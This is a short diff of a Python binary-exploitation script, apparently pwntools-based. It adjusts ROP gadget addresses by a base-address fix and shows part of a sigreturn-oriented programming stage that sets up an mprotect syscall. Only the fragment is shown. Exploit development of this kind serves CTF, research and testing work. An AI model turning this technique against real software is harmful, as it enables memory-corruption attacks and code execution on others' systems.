@@ -51,8 +51,8 @@ if __name__ == '__main__':
     data_size = 0x1000
 
     desired_syscall = 15
-    syscall_ret_gadget = t.rop.find_gadget(['syscall', 'ret']).address
-    ret_gadget = t.rop.find_gadget(['ret']).address
+    syscall_ret_gadget = t.rop.find_gadget(['syscall', 'ret']).address + t.base_address_fix
+    ret_gadget = t.rop.find_gadget(['ret']).address + t.base_address_fix
 
     stage1_frame = SigreturnFrame(arch="amd64", kernel="amd64")
     stage1_frame.rax = 10
